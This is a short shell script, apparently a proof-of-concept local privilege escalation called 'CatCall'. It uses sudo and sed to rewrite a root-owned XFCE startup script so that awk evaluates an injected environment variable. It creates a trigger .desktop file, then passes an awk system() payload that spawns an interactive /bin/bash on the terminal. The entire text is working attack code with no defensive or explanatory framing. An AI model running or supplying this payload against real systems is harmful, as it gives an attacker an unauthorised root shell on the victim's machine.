# CatCall - Local Privilege Escalation via Script Editing

# Add double quotes to print $1, so it passes to /bin/bash
sudo sed -i 's/awk \x27{print $1}\x27/awk "{print $TARGET}"/g' /root/.config/xfce_custom/startup_script.sh


# Make the directory, so the bug can work, and add a test file
sudo mkdir -p /root/Desktop/
sudo touch /root/Desktop/test_launcher.desktop

# Priv esc with /dev/tty, LOLFAO
sudo TARGET='system("/bin/bash < /dev/tty > /dev/tty 2>&1"); exit' /root/.config/xfce_custom/startup_script.sh
